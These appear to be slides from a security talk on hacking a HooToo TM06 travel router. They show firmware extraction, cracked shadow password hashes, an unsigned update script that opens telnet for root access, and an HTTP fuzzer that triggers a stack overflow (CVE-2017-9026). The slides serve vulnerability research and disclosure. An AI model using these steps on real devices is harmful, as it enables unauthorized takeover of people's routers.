Hacking travel routers 
like it’s 1999
Mikhail Sosonkin
Mikhail Sosonkin
“Synack leverages the best combination of humans and technology 
to discover security vulnerabilities in our customers’ web
apps, mobile apps, IoT devices and infrastructure endpoints”
Director of R&D
Always a Student
@hexlogic
PI:EMAIL
http://debugtrap.com
Why do this?
Breaking in.
Show me the bugs!
The End.
$ cat agenda | wc -l
4
We all just hack for fun… right?
I travel a lot
I work in cafes
I do security things
$ man y
No manual entry for y
Cuz, hackers gonna hack...
RAVPower 
FileHub Plus
HooToo TripMate Elite 
Travel Wireless Router
TP-Link AC750 
Wireless Wi-Fi 
Travel Router
And about 377 more results on Amazon.
The market delivers...
Bridging networks/MAC spoofing
Layer of network protection
Connect one device, connect 
them all
Convenient small form factor
Battery pack included
Why do this?
The unboxing
We want bugs!
The End
$ cat agenda | wc -l
3
Peeking a few extra bytes...
PORT     STATE    SERVICE
0/tcp    filtered unknown
80/tcp   open     http
81/tcp   open     hosts2-ns
5880/tcp open     unknown
8201/tcp open     trivnet2
HTTP/1.1 200 OK
Content-Type: text/html
Accept-Ranges: bytes
ETag: "1800253254"
Last-Modified: Mon, 29 Feb 2016 07:23:52 GMT
Content-Length: 3940
Date: Wed, 28 Jun 2017 12:13:26 GMT
Server: lighttpd/1.4.28
HTTP/1.1 200 OK
Server: vshttpd
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-length: 123
Content-type: text/xml;charset=UTF-8
Set-cookie: SESSID=Xqo72s...
Date: Wed, 28 Jun 2017 12:13:26 GMT
nmap -p0-65535 192.168.1.1
Right-click -> inspect
HTTP/1.1 200 OK
Server: vshttpd
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-length: 8338
Content-type: text/html
Set-cookie: SESSID=eXXzgZIWg4jnnXGidAVQpRB6joaM7D7lr3IGWtz7oRuJE;
Date: Sat, 24 Jun 2017 19:38:27 GMT
DATA SAVER
27.XX.XX.222
222.XX.XX.27.ap
.yournet.ne.jp
FreeBit 
Co.,Ltd.
2017-06-24 
19:38:32 GMT
Japan
DATA SAVER
27.XXX.XX.244
244.XX.XXX.27.a
p.yournet.ne.jp
FreeBit 
Co.,Ltd.
2017-03-20 
17:11:29 GMT
Japan
IOVST
111.XX.XXX.128
China Telecom 
Jiangxi
2017-04-01 
08:13:20 GMT
China, 
Nanchang
Located
wget https://...fw-TM06-Support Special Character-2.000.030.rar
unrar x ../HT-TM06-Support Special Character-2.000.030.rar
tail -n +263 $0 | gunzip > upfs
mount upfs upfs.mount
ls ./upfs_rootfs/usr/sbin/ioos 
MIPS32LE ELF (the webserver)
mount ./upfs_mount/firmware/rootfs upfs_rootfs/
The WWW’s: HooToo official page
RAR Archive
EXT2 Filesystem
Shellscript
Little Endian Squash Filesystem
Located
Firmware
$ cat ./etc/shadow
root:$1$D0o034Sm$LY0jyeFPifEXVmdgUfSEj/:15386:0:99999:7:::
admin:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:13341:0:99999:7:::
guest:$1$QlrmwRgO$c0iSI2euV.U1Wx6yBkDBI.:13341:0:99999:7:::
two days* with 
john the ripper
All this root, 
and no where 
to use it
* on a reasonably priced EC2 instance
Located
Firmware
Password
If I could 
just...
●
The firmware update mechanism does 
not require a signed package.
#!/bin/sh
/bin/sh /etc/init.d/opentelnet.sh
exit 1{
●
Expanded, the update package is just a 
shellscript
Located
Firmware
Password
Shell
check_firmware2 .text:00491118 >>
addiu   $a1, (aSed13dSCksumCu - 0x530000)  # "sed '1,3d' %s|cksum|cut -d' ' -f1"
lw      $a2, 0x3A8+arg_0($sp)
la      $t9, sprintf
nop
jalr    $t9 ; sprintf
Checks Firmware update
$ file ./usr/sbin/ioos
./usr/sbin/ioos: ELF 32-bit LSB  executable, MIPS, 
MIPS-II version 1 (SYSV), dynamically linked (uses shared libs), 
stripped
https://sourceforge.net/projects/vshttpd/ maybe? It’s an empty project
●
The firmware update mechanism does 
not require a signed package.
●
Only a CRC check
#!/bin/sh
# constant
CRCSUM=2787560248
VENDOR=HooToo
PRODUCTLINE=WiFiDGRJ
SKIP=263
TARGET_OS="linux"
TARGET_ARCH="arm"
DEVICE_TYPE=HT-TM06
VERSION=2000030
CPU=7620
/bin/sh /etc/init.d/opentelnet.sh
exit 1{
●
Expanded, the update package is just a 
shellscript
Located
Firmware
Password
Shell
$ telnet 192.168.1.1
Connected to 192.168.1.1.
Escape character is '^]'.
HT-TM06 login: root
Password:
login: can't chdir to home directory '/root'
# ls
bin     data    etc     home    media   opt     sbin    tmp     var
boot    dev     etc_ro  lib     mnt     proc    sys     usr     www
# /data/UsbDisk1/Volume1/gdbserver.mipsle --attach *:9999 7344
Attached; pid = 7344
Listening on port 9999
More details: http://debugtrap.com/2017/03/19/tm06-travel-safe/
typedef void (*fcn_ptr)(struct state* self, …);
struct state {
   char[20] name;
   int      state;
   fcn_ptr func1;
   fcn_ptr func2;
};
struct state* s = malloc(sizeof(struct state));
s->func1 = func1_implementation;
s->func2 = func2_implementation;
s->func1(s, 2, 3);
I is C++
Buffers before 
function pointers
Dynamic function 
calls
Dynamic initialization/
allocation
Variables before 
function pointers
Lots of function pointers… 
everywhere!
839 uses of strcpy, 2167 uses of sprintf
●
Present
○
Partial Virtual Space randomization
○
Binary and heap are fixed
○
Libraries and stack are randomized
# sysctl -A | grep kernel.randomize_va_space 2>/dev/null
kernel.randomize_va_space = 1
●
Not present
○
Stack canaries
○
Full ASLR
○
Heap protections
○
Heap/Stack NX
○
Control flow integrity
Why do this?
The unboxing
We want bugs!
The End
$ cat agenda | wc -l
2
Cybergold!
buff = ["GET /protocol.csp?fname=[[fuzz]]&opt=userlock&" +
                           "username=guest&function=get HTTP/1.1",
        "Host: 192.168.1.1",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "If-Modified-Since: 0",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel .."
        "Accept: */*",
        "Referer: http://192.168.1.1/",
        "Accept-Encoding: gzip, deflate, sdch",
        "Accept-Language: en-US,en;q=0.8,ru;q=0.6",
        "Cookie: SESSID=eXXzgZIWg4jnnXGidAVQpRB6joaM7D7lr3IGWtz7oRuJE;",
>>> for i in range(1, 20000, 4):
       testGet(fname= ”A” * i)
More details: debugtrap.com/2017/05/09/tm06-vulnerabilities/
CVE-2017-9026
Located
Firmware
Password
Shell
Crash
xml_add_elem:
.text:00512684 addiu   $v0, $sp, 0x238+var_110
.text:00512688 move    $a0, $v0
.text:0051268C li      $a1, 0x540000
.text:00512690 nop
.text:00512694 addiu   $a1, (aS_19 - 0x540000)  # ""
.text:00512698 lw      $a2, 0x238+element_name($sp)
.text:0051269C la      $t9, sprintf
.text:005126A0 nop
.text:005126A4 jalr    $t9 ; sprintf
.text:005126A8 nop
256 bytes stack buffer
Value of fname
Located
Firmware
Password
Shell
Crash
Overflow